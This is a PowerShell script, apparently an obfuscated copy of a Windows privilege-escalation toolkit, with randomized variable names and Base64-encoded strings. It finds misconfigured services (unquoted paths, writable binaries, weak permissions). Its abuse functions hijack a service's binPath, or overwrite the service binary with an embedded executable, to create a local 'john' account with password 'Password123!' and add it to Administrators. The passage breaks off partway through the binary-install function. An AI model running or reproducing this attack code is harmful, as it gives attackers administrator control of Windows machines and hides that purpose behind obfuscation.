Add-Type $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAFsAUwB5AHMAdABlAG0ALgBGAGwAYQBnAHMAQQB0AHQAcgBpAGIAdQB0AGUAXQANAAoAIAAgAHAAdQBiAGwAaQBjACAAZQBuAHUAbQAgAFMAZQByAHYAaQBjAGUAQQBjAGMAZQBzAHMARgBsAGEAZwBzACAAOgAgAHUAaQBuAHQADQAKACAAIAB7AA0ACgAgACAAIAAgACAAIABDAEMAIAA9ACAAMQAsAA0ACgAgACAAIAAgACAAIABEAEMAIAA9ACAAMgAsAA0ACgAgACAAIAAgACAAIABMAEMAIAA9ACAANAAsAA0ACgAgACAAIAAgACAAIABTAFcAIAA9ACAAOAAsAA0ACgAgACAAIAAgACAAIABSAFAAIAA9ACAAMQA2ACwADQAKACAAIAAgACAAIAAgAFcAUAAgAD0AIAAzADIALAANAAoAIAAgACAAIAAgACAARABUACAAPQAgADYANAAsAA0ACgAgACAAIAAgACAAIABMAE8AIAA9ACAAMQAyADgALAANAAoAIAAgACAAIAAgACAAQwBSACAAPQAgADIANQA2ACwADQAKACAAIAAgACAAIAAgAFMARAAgAD0AIAA2ADUANQAzADYALAANAAoAIAAgACAAIAAgACAAUgBDACAAPQAgADEAMwAxADAANwAyACwADQAKACAAIAAgACAAIAAgAFcARAAgAD0AIAAyADYAMgAxADQANAAsAA0ACgAgACAAIAAgACAAIABXAE8AIAA9ACAANQAyADQAMgA4ADgALAANAAoAIAAgACAAIAAgACAARwBBACAAPQAgADIANgA4ADQAMwA1ADQANQA2ACwADQAKACAAIAAgACAAIAAgAEcAWAAgAD0AIAA1ADMANgA4ADcAMAA5ADEAMgAsAA0ACgAgACAAIAAgACAAIABHAFcAIAA9ACAAMQAwADcAMwA3ADQAMQA4ADIANAAsAA0ACgAgACAAIAAgACAAIABHAFIAIAA9ACAAMgAxADQANwA0ADgAMwA2ADQAOAANAAoAIAAgAH0A')))
function Get-ModifiableFile {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        ${d3bfda1f12f74d9da143c7e63466c346}
    )
    begin {
        ${7114ce9927cc4cb5866804a80448057e} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBzAE0AcABFAG4AZwAuAGUAeABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBpAHMAUwByAHYALgBlAHgAZQA='))))
        ${e12e52497f734f1388f7943a3bbbb324} = $ErrorActionPreference
        $ErrorActionPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
    }
    process {
        ${ce4267d16ad84f4ab37d2e8858f2ddd4} = @()
        ${ce4267d16ad84f4ab37d2e8858f2ddd4} += ${d3bfda1f12f74d9da143c7e63466c346}.split("`"'") | ? { $_ -and (Test-Path $_) }
        ${ce4267d16ad84f4ab37d2e8858f2ddd4} += ${d3bfda1f12f74d9da143c7e63466c346}.split() | ? { $_ -and (Test-Path $_) }
        ${ce4267d16ad84f4ab37d2e8858f2ddd4} | sort -Unique | ? {$_} | ? {
            ${a3f321608b6e4fcea6dcac97477c3418} = $False
            ForEach(${2204f2b279724f548ba648e3b4d91bde} in ${7114ce9927cc4cb5866804a80448057e}) {
                if($_ -match ${2204f2b279724f548ba648e3b4d91bde}) { ${a3f321608b6e4fcea6dcac97477c3418} = $True }
            }
            if(!${a3f321608b6e4fcea6dcac97477c3418}) {$True}
        } | % {
            try {
                ${e0e74a4e895247b9bda719de1e2ba09a} = [System.Environment]::ExpandEnvironmentVariables($_)
                ${de5cb5ba90ad4bc8bb51656ffff8e282} = gi -Path ${e0e74a4e895247b9bda719de1e2ba09a} -Force
                ${473aebeac2b44100b88cbcbfb0960085} = ${de5cb5ba90ad4bc8bb51656ffff8e282}.OpenWrite()
                $Null = ${473aebeac2b44100b88cbcbfb0960085}.Close()
                ${e0e74a4e895247b9bda719de1e2ba09a}
            }
            catch {}
        }
    }
    end {
        $ErrorActionPreference = ${e12e52497f734f1388f7943a3bbbb324}
    }
}
function Test-ServiceDaclPermission {
    [CmdletBinding()]
        Param(
            [Parameter(Mandatory = $True)]
            [string]
            ${cc65ff03bac14e3c93ae0d1263250bd2},
            [Parameter(Mandatory = $True)]
            [string]
            ${a820bec9d026469cbb44dd8a298b17af}
        )
    if (-not (Test-Path ("$env:SystemRoot\system32\sc.exe"))){ 
        Write-Warning "[!] Could not find $env:SystemRoot\system32\sc.exe"
        return $False
    }
    ${1d0810300cb349249997357949a844aa} = gwmi -Class win32_service -Filter "Name='${cc65ff03bac14e3c93ae0d1263250bd2}'" | ? {$_}
    if (-not (${1d0810300cb349249997357949a844aa})){
        Write-Warning "[!] Target service '${cc65ff03bac14e3c93ae0d1263250bd2}' not found on the machine"
        return $False
    }
    try {
        ${bd522dee39524050891f459434e6b4ce} = sc.exe sdshow ${1d0810300cb349249997357949a844aa}.Name | where {$_}
        if (${bd522dee39524050891f459434e6b4ce} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBPAHAAZQBuAFMAZQByAHYAaQBjAGUAIABGAEEASQBMAEUARAAqAA==')))){
                Write-Warning "[!] Access to service $(${1d0810300cb349249997357949a844aa}.Name) denied"
                return $False
        }
        ${97b1f0761e6643b9b9b2ad6a36de3316} = New-Object System.Security.AccessControl.RawSecurityDescriptor(${bd522dee39524050891f459434e6b4ce})
        ${341ff07a284844a7a05049cc74ecd5dc} = whoami /groups /FO csv | ConvertFrom-Csv | select $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) | % {$_.Sid}
        ${341ff07a284844a7a05049cc74ecd5dc} += [System.Security.Principal.WindowsIdentity]::GetCurrent().User.value
        ForEach ($Sid in ${341ff07a284844a7a05049cc74ecd5dc}){
            ForEach ($Ace in ${97b1f0761e6643b9b9b2ad6a36de3316}.DiscretionaryAcl){   
                if ($Sid -eq $Ace.SecurityIdentifier){
                    ${910d25c30e3e4e798ef411e0dff45cf9} = [string]([ServiceAccessFlags] $Ace.AccessMask) -replace ', ',''
                    ${a1020d72861c4e7ca4e6fe539eff0f28} = [array] (${a820bec9d026469cbb44dd8a298b17af} -split $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuAHsAMgB9ACkA'))) | ? {$_})
                    ${f210229424c3433ea056e4aac1819bed} = 0
                    ForEach ($DaclPermission in ${a1020d72861c4e7ca4e6fe539eff0f28}){
                        if (${910d25c30e3e4e798ef411e0dff45cf9}.Contains($DaclPermission.ToUpper())){
                            ${f210229424c3433ea056e4aac1819bed} += 1
                        }
                        else{
                            break
                        }
                    }
                    if (${f210229424c3433ea056e4aac1819bed}-eq ${a1020d72861c4e7ca4e6fe539eff0f28}.Count){
                        return $True
                    }
                }  
            }
        }
        return $False
    }
    catch{
        Write-Warning "Error: $_"
        return $False
    }
}
function Invoke-ServiceStart {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        ${cc65ff03bac14e3c93ae0d1263250bd2}
    )
    process {
        ${1d0810300cb349249997357949a844aa} = gwmi -Class win32_service -Filter "Name='${cc65ff03bac14e3c93ae0d1263250bd2}'" | ? {$_}
        if (-not (${1d0810300cb349249997357949a844aa})){
            Write-Warning "[!] Target service '${cc65ff03bac14e3c93ae0d1263250bd2}' not found on the machine"
            return $False
        }
        try {
            if (${1d0810300cb349249997357949a844aa}.StartMode -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBiAGwAZQBkAA==')))){
                ${1d1990d9564f44a5a2746ab8a252339d} = Invoke-ServiceEnable -cc65ff03bac14e3c93ae0d1263250bd2 "$(${1d0810300cb349249997357949a844aa}.Name)"
                if (-not ${1d1990d9564f44a5a2746ab8a252339d}){ 
                    return $False 
                }
            }
            Write-Verbose "Starting service '$(${1d0810300cb349249997357949a844aa}.Name)'"
            $Null = sc.exe start "$(${1d0810300cb349249997357949a844aa}.Name)"
            sleep -s .5
            return $True
        }
        catch{
            Write-Warning "Error: $_"
            return $False
        }
    }
}
function Invoke-ServiceStop {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        ${cc65ff03bac14e3c93ae0d1263250bd2}
    )
    process {
        ${1d0810300cb349249997357949a844aa} = gwmi -Class win32_service -Filter "Name='${cc65ff03bac14e3c93ae0d1263250bd2}'" | ? {$_}
        if (-not (${1d0810300cb349249997357949a844aa})){
            Write-Warning "[!] Target service '${cc65ff03bac14e3c93ae0d1263250bd2}' not found on the machine"
            return $False
        }
        try {
            Write-Verbose "Stopping service '$(${1d0810300cb349249997357949a844aa}.Name)'"
            ${bd522dee39524050891f459434e6b4ce} = sc.exe stop "$(${1d0810300cb349249997357949a844aa}.Name)"
            if (${bd522dee39524050891f459434e6b4ce} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBBAGMAYwBlAHMAcwAgAGkAcwAgAGQAZQBuAGkAZQBkACoA')))){
                Write-Warning "[!] Access to service $(${1d0810300cb349249997357949a844aa}.Name) denied"
                return $False
            }
            elseif (${bd522dee39524050891f459434e6b4ce} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAxADAANQAxACoA')))) {
                Write-Warning "[!] Stopping service $(${1d0810300cb349249997357949a844aa}.Name) failed: ${bd522dee39524050891f459434e6b4ce}"
                return $False
            }
            sleep 1
            return $True
        }
        catch{
            Write-Warning "Error: $_"
            return $False
        }
    }
}
function Invoke-ServiceEnable {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        ${cc65ff03bac14e3c93ae0d1263250bd2}
    )
    process {
        ${1d0810300cb349249997357949a844aa} = gwmi -Class win32_service -Filter "Name='${cc65ff03bac14e3c93ae0d1263250bd2}'" | ? {$_}
        if (-not (${1d0810300cb349249997357949a844aa})){
            Write-Warning "[!] Target service '${cc65ff03bac14e3c93ae0d1263250bd2}' not found on the machine"
            return $False
        }
        try {
            Write-Verbose "Enabling service '${1d0810300cb349249997357949a844aa}.Name'"
            $Null = sc.exe config "$(${1d0810300cb349249997357949a844aa}.Name)" start= demand
            return $True
        }
        catch{
            Write-Warning "Error: $_"
            return $False
        }
    }
}
function Invoke-ServiceDisable {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        ${cc65ff03bac14e3c93ae0d1263250bd2}
    )
    process {
        ${1d0810300cb349249997357949a844aa} = gwmi -Class win32_service -Filter "Name='${cc65ff03bac14e3c93ae0d1263250bd2}'" | ? {$_}
        if (-not (${1d0810300cb349249997357949a844aa})){
            Write-Warning "[!] Target service '${cc65ff03bac14e3c93ae0d1263250bd2}' not found on the machine"
            return $False
        }
        try {
            Write-Verbose "Disabling service '${1d0810300cb349249997357949a844aa}.Name'"
            $Null = sc.exe config "$(${1d0810300cb349249997357949a844aa}.Name)" start= disabled
            return $True
        }
        catch{
            Write-Warning "Error: $_"
            return $False
        }
    }
}
function Get-ServiceUnquoted {
    ${5d32e17d937647afbfd1a183fc5388b7} = gwmi -Class win32_service | ? {$_} | ? {($_.pathname -ne $null) -and ($_.pathname.trim() -ne "")} | ? {-not $_.pathname.StartsWith("`"")} | ? {-not $_.pathname.StartsWith("'")} | ? {($_.pathname.Substring(0, $_.pathname.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBlAHgAZQA=')))) + 4)) -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAqACAALgAqAA==')))}
    if (${5d32e17d937647afbfd1a183fc5388b7}) {
        ForEach ($Service in ${5d32e17d937647afbfd1a183fc5388b7}){
            ${3511249d1e9f43519714ca9c156d8f53} = New-Object PSObject 
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBOAGEAbQBlAA=='))) $Service.name
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))) $Service.pathname
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AE4AYQBtAGUA'))) $Service.startname
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBiAHUAcwBlAEYAdQBuAGMAdABpAG8AbgA='))) "Write-ServiceBinary -ServiceName '$($Service.name)' -Path <HijackPath>"
            ${3511249d1e9f43519714ca9c156d8f53}
        }
    }
}
function Get-ServiceFilePermission {
    Get-WMIObject -Class win32_service | ? {$_ -and $_.pathname} | % {
        ${cc65ff03bac14e3c93ae0d1263250bd2} = $_.name
        ${c3fc125f10214ca8918bb2b0a42af00b} = $_.pathname
        ${1b80c0d0bea94a77bcd5da64a90dc526} = $_.startname
        ${c3fc125f10214ca8918bb2b0a42af00b} | Get-ModifiableFile | % {
            ${3511249d1e9f43519714ca9c156d8f53} = New-Object PSObject 
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBOAGEAbQBlAA=='))) ${cc65ff03bac14e3c93ae0d1263250bd2}
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))) ${c3fc125f10214ca8918bb2b0a42af00b}
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAGQAaQBmAGkAYQBiAGwAZQBGAGkAbABlAA=='))) $_
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AE4AYQBtAGUA'))) ${1b80c0d0bea94a77bcd5da64a90dc526}
            ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBiAHUAcwBlAEYAdQBuAGMAdABpAG8AbgA='))) "Install-ServiceBinary -ServiceName '${cc65ff03bac14e3c93ae0d1263250bd2}'"
            ${3511249d1e9f43519714ca9c156d8f53}
        }
    }
}
function Get-ServicePermission {
    if (-not (Test-Path ("$Env:SystemRoot\System32\sc.exe"))) { 
        Write-Warning "[!] Could not find $Env:SystemRoot\System32\sc.exe"
        ${3511249d1e9f43519714ca9c156d8f53} = New-Object PSObject 
        ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBOAGEAbQBlAA=='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABGAG8AdQBuAGQA')))
        ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))) "$Env:SystemRoot\System32\sc.exe"
        ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AE4AYQBtAGUA'))) $Null
        ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBiAHUAcwBlAEYAdQBuAGMAdABpAG8AbgA='))) $Null
        ${3511249d1e9f43519714ca9c156d8f53}
    }
    ${ee4d7fa7d1a84b0b854f096ce45d780c} = gwmi -Class win32_service | ? {$_}
    if (${ee4d7fa7d1a84b0b854f096ce45d780c}) {
        ForEach ($Service in ${ee4d7fa7d1a84b0b854f096ce45d780c}){
            ${bd522dee39524050891f459434e6b4ce} = sc.exe config $($Service.Name) error= $($Service.ErrorControl)
            if (${bd522dee39524050891f459434e6b4ce} -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAEMAXQAgAEMAaABhAG4AZwBlAFMAZQByAHYAaQBjAGUAQwBvAG4AZgBpAGcAIABTAFUAQwBDAEUAUwBTAA==')))){
                ${3511249d1e9f43519714ca9c156d8f53} = New-Object PSObject 
                ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBOAGEAbQBlAA=='))) $Service.name
                ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))) $Service.pathname
                ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AE4AYQBtAGUA'))) $Service.startname
                ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBiAHUAcwBlAEYAdQBuAGMAdABpAG8AbgA='))) "Invoke-ServiceAbuse -ServiceName '$($Service.name)'"
                ${3511249d1e9f43519714ca9c156d8f53}
            }
        }
    }
}
function Get-ServiceDetail {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        ${cc65ff03bac14e3c93ae0d1263250bd2}
    )
    process {
        gwmi -Class win32_service -Filter "Name='${cc65ff03bac14e3c93ae0d1263250bd2}'" | ? {$_} | % {
            try {
                $_ | fl *
            }
            catch{
                Write-Warning "Error: $_"
                $null
            }            
        }
    }
}
function Invoke-ServiceAbuse {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        ${cc65ff03bac14e3c93ae0d1263250bd2},
        [String]
        ${a913b56191f84144ba519b305233ff1d} = "john",
        [String]
        ${eaed2f8ac2be4efea8d07548d5c48416} = "Password123!",
        [String]
        ${b16577e783ee4711a57b9c7c86e8e332} = "Administrators",
        [String]
        ${c8f2338999514b2e859cc9473f0787c6}
    )
    process {
        ${1d0810300cb349249997357949a844aa} = gwmi -Class win32_service -Filter "Name='${cc65ff03bac14e3c93ae0d1263250bd2}'" | ? {$_}
        if (${1d0810300cb349249997357949a844aa}) {
            ${ebb1941a96154df1b31a994bf8cb89a7} = ${1d0810300cb349249997357949a844aa}.Name
            ${a610331941584e3cb155ce5765af42ce} = $Null
            ${14203cd9a48a4bdcb81e1900b16898cd} = $Null
            ${7bde21e43faa49f4bab3aecfd2ebaa1d} = $Null
            try {
                if (-not (Test-Path ("$Env:SystemRoot\System32\sc.exe"))){ 
                    throw "Could not find $Env:SystemRoot\System32\sc.exe"
                }
                ${608f0c9852564db08d370b735ebd1211} = $False
                if (${1d0810300cb349249997357949a844aa}.StartMode -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBiAGwAZQBkAA==')))) {
                    Write-Verbose "Service '${cc65ff03bac14e3c93ae0d1263250bd2}' disabled, enabling..."
                    if(-not $(Invoke-ServiceEnable -cc65ff03bac14e3c93ae0d1263250bd2 ${cc65ff03bac14e3c93ae0d1263250bd2})) {
                        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBuACAAZQBuAGEAYgBsAGkAbgBnACAAZABpAHMAYQBiAGwAZQBkACAAcwBlAHIAdgBpAGMAZQAuAA==')))
                    }
                    ${608f0c9852564db08d370b735ebd1211} = $True
                }
                ${450a0db1c8fd4b45b805a5082fa80738} = ${1d0810300cb349249997357949a844aa}.PathName
                ${3f49df3f4430467faba2a528c7ad36fc} = ${1d0810300cb349249997357949a844aa}.State
                Write-Verbose "Service '${cc65ff03bac14e3c93ae0d1263250bd2}' original path: '${450a0db1c8fd4b45b805a5082fa80738}'"
                Write-Verbose "Service '${cc65ff03bac14e3c93ae0d1263250bd2}' original state: '${3f49df3f4430467faba2a528c7ad36fc}'"
                ${0c3bc8d35f4d4711860298908d6e4978} = @()
                if(${c8f2338999514b2e859cc9473f0787c6}) {
                    ${0c3bc8d35f4d4711860298908d6e4978} += ${c8f2338999514b2e859cc9473f0787c6}
                }
                elseif(${a913b56191f84144ba519b305233ff1d}.Contains("\")) {
                    ${0c3bc8d35f4d4711860298908d6e4978} += "net localgroup ${b16577e783ee4711a57b9c7c86e8e332} ${a913b56191f84144ba519b305233ff1d} /add"
                }
                else {
                    ${0c3bc8d35f4d4711860298908d6e4978} += "net user ${a913b56191f84144ba519b305233ff1d} ${eaed2f8ac2be4efea8d07548d5c48416} /add"
                    ${0c3bc8d35f4d4711860298908d6e4978} += "net localgroup ${b16577e783ee4711a57b9c7c86e8e332} ${a913b56191f84144ba519b305233ff1d} /add"
                }
                foreach($Cmd in ${0c3bc8d35f4d4711860298908d6e4978}) {
                    if(-not $(Invoke-ServiceStop -cc65ff03bac14e3c93ae0d1263250bd2 ${1d0810300cb349249997357949a844aa}.Name)) {
                        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBuACAAcwB0AG8AcABwAGkAbgBnACAAcwBlAHIAdgBpAGMAZQAuAA==')))
                    }
                    Write-Verbose "Executing command '$Cmd'"
                    ${bd522dee39524050891f459434e6b4ce} = sc.exe config $(${1d0810300cb349249997357949a844aa}.Name) binPath= $Cmd
                    if (${bd522dee39524050891f459434e6b4ce} -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAIABpAHMAIABkAGUAbgBpAGUAZAAuAA==')))){
                        throw "Access to service $(${1d0810300cb349249997357949a844aa}.Name) denied"
                    }
                    $Null = Invoke-ServiceStart -cc65ff03bac14e3c93ae0d1263250bd2 ${1d0810300cb349249997357949a844aa}.Name
                }
                Write-Verbose "Restoring original path to service '${cc65ff03bac14e3c93ae0d1263250bd2}'"
                $Null = sc.exe config $(${1d0810300cb349249997357949a844aa}.Name) binPath= ${450a0db1c8fd4b45b805a5082fa80738}
                if(${608f0c9852564db08d370b735ebd1211}) {
                    Write-Verbose "Re-disabling service '${cc65ff03bac14e3c93ae0d1263250bd2}'"
                    ${bd522dee39524050891f459434e6b4ce} = sc.exe config $(${1d0810300cb349249997357949a844aa}.Name) start= disabled
                }
                elseif(${3f49df3f4430467faba2a528c7ad36fc} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHUAcwBlAGQA')))) {
                    Write-Verbose "Starting and then pausing service '${cc65ff03bac14e3c93ae0d1263250bd2}'"
                    $Null = Invoke-ServiceStart -cc65ff03bac14e3c93ae0d1263250bd2  ${1d0810300cb349249997357949a844aa}.Name
                    $Null = sc.exe pause $(${1d0810300cb349249997357949a844aa}.Name)
                }
                elseif(${3f49df3f4430467faba2a528c7ad36fc} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABwAGUAZAA=')))) {
                    Write-Verbose "Leaving service '${cc65ff03bac14e3c93ae0d1263250bd2}' in stopped state"
                }
                else {
                    $Null = Invoke-ServiceStart -cc65ff03bac14e3c93ae0d1263250bd2  ${1d0810300cb349249997357949a844aa}.Name
                }
            }
            catch {
                Write-Warning "Error while modifying service '${cc65ff03bac14e3c93ae0d1263250bd2}': $_"
                ${0c3bc8d35f4d4711860298908d6e4978} = @("Error while modifying service '${cc65ff03bac14e3c93ae0d1263250bd2}': $_")
            }
        }
        else {
            Write-Warning "Target service '${cc65ff03bac14e3c93ae0d1263250bd2}' not found on the machine"
            ${0c3bc8d35f4d4711860298908d6e4978} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABmAG8AdQBuAGQA')))
        }
        ${3511249d1e9f43519714ca9c156d8f53} = New-Object PSObject
        ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBBAGIAdQBzAGUAZAA='))) ${ebb1941a96154df1b31a994bf8cb89a7}
        ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBhAG4AZAA='))) $(${0c3bc8d35f4d4711860298908d6e4978} -join $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAmACYAIAA='))))
        ${3511249d1e9f43519714ca9c156d8f53}
    }
}
function Write-ServiceBinary {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        ${cc65ff03bac14e3c93ae0d1263250bd2},
        [String]
        ${c3fc125f10214ca8918bb2b0a42af00b} = "service.exe",
        [String]
        ${a913b56191f84144ba519b305233ff1d} = "john",
        [String]
        ${eaed2f8ac2be4efea8d07548d5c48416} = "Password123!",
        [String]
        ${b16577e783ee4711a57b9c7c86e8e332} = "Administrators",
        [String]
        ${c8f2338999514b2e859cc9473f0787c6}
    )
    begin {
        ${f6e5f089f3424191a352319bdc45a59e} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABW...APQA='))) # The omitted 'VABW...APQA=' is actually a 78287 character long Base64 string.
        [Byte[]] ${c7ec2c9415df4ba1b7f00bbb590355e9} = [Byte[]][Convert]::FromBase64String(${f6e5f089f3424191a352319bdc45a59e})
    }
    process {
        if(-not ${c8f2338999514b2e859cc9473f0787c6}) {
            if(${a913b56191f84144ba519b305233ff1d}.Contains("\")) {
                ${c8f2338999514b2e859cc9473f0787c6} = "net localgroup ${b16577e783ee4711a57b9c7c86e8e332} ${a913b56191f84144ba519b305233ff1d} /add"
            }
            else {
                ${c8f2338999514b2e859cc9473f0787c6} = "net user ${a913b56191f84144ba519b305233ff1d} ${eaed2f8ac2be4efea8d07548d5c48416} /add && timeout /t 2 && net localgroup ${b16577e783ee4711a57b9c7c86e8e332} ${a913b56191f84144ba519b305233ff1d} /add"
            }
        }
        ${b3992cfe587c4151ad11bb785ad6f1c4} = [System.Text.Encoding]::Unicode
        ${d089d8c6344e409ab7957ada095fdc60} = ${b3992cfe587c4151ad11bb785ad6f1c4}.GetBytes(${cc65ff03bac14e3c93ae0d1263250bd2})
        ${9d1f0f79999849a19529188a814ea1ff} = ${b3992cfe587c4151ad11bb785ad6f1c4}.GetBytes(${c8f2338999514b2e859cc9473f0787c6})
        for (${edb551fa736245b6b29fdbd71c23b32f}=0; ${edb551fa736245b6b29fdbd71c23b32f} -lt (${d089d8c6344e409ab7957ada095fdc60}.Length); ${edb551fa736245b6b29fdbd71c23b32f}++) { 
            ${c7ec2c9415df4ba1b7f00bbb590355e9}[${edb551fa736245b6b29fdbd71c23b32f}+2458] = ${d089d8c6344e409ab7957ada095fdc60}[${edb551fa736245b6b29fdbd71c23b32f}]
        }
        for (${edb551fa736245b6b29fdbd71c23b32f}=0; ${edb551fa736245b6b29fdbd71c23b32f} -lt (${9d1f0f79999849a19529188a814ea1ff}.Length); ${edb551fa736245b6b29fdbd71c23b32f}++) { 
            ${c7ec2c9415df4ba1b7f00bbb590355e9}[${edb551fa736245b6b29fdbd71c23b32f}+2535] = ${9d1f0f79999849a19529188a814ea1ff}[${edb551fa736245b6b29fdbd71c23b32f}]
        }
        try {
            sc -Value ${c7ec2c9415df4ba1b7f00bbb590355e9} -Encoding Byte -Path ${c3fc125f10214ca8918bb2b0a42af00b} -Force
        }
        catch {
            ${967738316d624590835926839a64c06f} = "Error while writing to location '${c3fc125f10214ca8918bb2b0a42af00b}': $_"
            Write-Warning ${967738316d624590835926839a64c06f}
            ${c8f2338999514b2e859cc9473f0787c6} = ${967738316d624590835926839a64c06f}
        }
        ${3511249d1e9f43519714ca9c156d8f53} = New-Object PSObject
        ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBOAGEAbQBlAA=='))) ${cc65ff03bac14e3c93ae0d1263250bd2}
        ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAdABoAA=='))) ${c3fc125f10214ca8918bb2b0a42af00b}
        ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBhAG4AZAA='))) ${c8f2338999514b2e859cc9473f0787c6}
        ${3511249d1e9f43519714ca9c156d8f53}
    }
}
function Install-ServiceBinary {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        ${cc65ff03bac14e3c93ae0d1263250bd2},
        [String]
        ${a913b56191f84144ba519b305233ff1d} = "john",
        [String]
        ${eaed2f8ac2be4efea8d07548d5c48416} = "Password123!",
        [String]
        ${b16577e783ee4711a57b9c7c86e8e332} = "Administrators",
        [String]
        ${c8f2338999514b2e859cc9473f0787c6}
    )
    process {
        ${1d0810300cb349249997357949a844aa} = gwmi -Class win32_service -Filter "Name='${cc65ff03bac14e3c93ae0d1263250bd2}'" | ? {$_}
        if (${1d0810300cb349249997357949a844aa}){
            try {
                ${c3fc125f10214ca8918bb2b0a42af00b} = (${1d0810300cb349249997357949a844aa}.PathName.Substring(0, ${1d0810300cb349249997357949a844aa}.PathName.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBlAHgAZQA=')))) + 4)).Replace('"',"")
